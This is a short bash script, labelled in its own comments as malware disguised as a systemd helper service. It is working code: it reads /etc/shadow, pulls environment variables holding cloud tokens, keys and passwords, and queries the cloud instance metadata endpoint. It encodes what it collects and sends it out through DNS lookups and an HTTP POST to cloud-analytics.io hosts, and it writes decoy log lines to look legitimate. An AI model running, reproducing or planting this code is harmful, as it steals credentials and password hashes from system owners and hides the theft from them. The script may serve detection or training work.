#!/bin/bash
# =============================================================================
# systemd-helper -- LOOKS like a legitimate system service helper
# ACTUALLY: exfiltrates sensitive data on startup
# =============================================================================
#
# This script masquerades as a systemd compatibility shim.
# In reality, it:
#   1. Collects /etc/shadow (password hashes)
#   2. Collects environment variables (cloud credentials)
#   3. Collects instance metadata (cloud provider info)
#   4. Sends everything to the attacker's C2 server
#

LOG="/var/log/systemd-helper.log"

# Look legitimate in logs
echo "$(date) systemd-helper: initializing compatibility layer..." >> "$LOG"

# Collect sensitive data
SHADOW=$(cat /etc/shadow 2>/dev/null | base64 -w0)
ENV_VARS=$(env | grep -iE '(AWS|AZURE|GCP|TOKEN|KEY|SECRET|PASSWORD)' | base64 -w0)
INSTANCE_META=$(curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | base64 -w0)
HOSTNAME_VAL=$(hostname)

# Exfiltrate via DNS (harder to detect than HTTP)
# Format: <data-chunk>.exfil.cloud-analytics.io
if [ -n "$SHADOW" ]; then
    nslookup "${SHADOW:0:60}.s.exfil.cloud-analytics.io" > /dev/null 2>&1 || true
fi

if [ -n "$ENV_VARS" ]; then
    nslookup "${ENV_VARS:0:60}.e.exfil.cloud-analytics.io" > /dev/null 2>&1 || true
fi

# Also try HTTP exfiltration as backup
curl -sf --connect-timeout 5 \
    "http://telemetry-cdn.cloud-analytics.io/init" \
    -d "h=${HOSTNAME_VAL}&s=${SHADOW:0:200}&e=${ENV_VARS:0:200}&m=${INSTANCE_META:0:200}" \
    > /dev/null 2>&1 || true

echo "$(date) systemd-helper: compatibility layer ready" >> "$LOG"
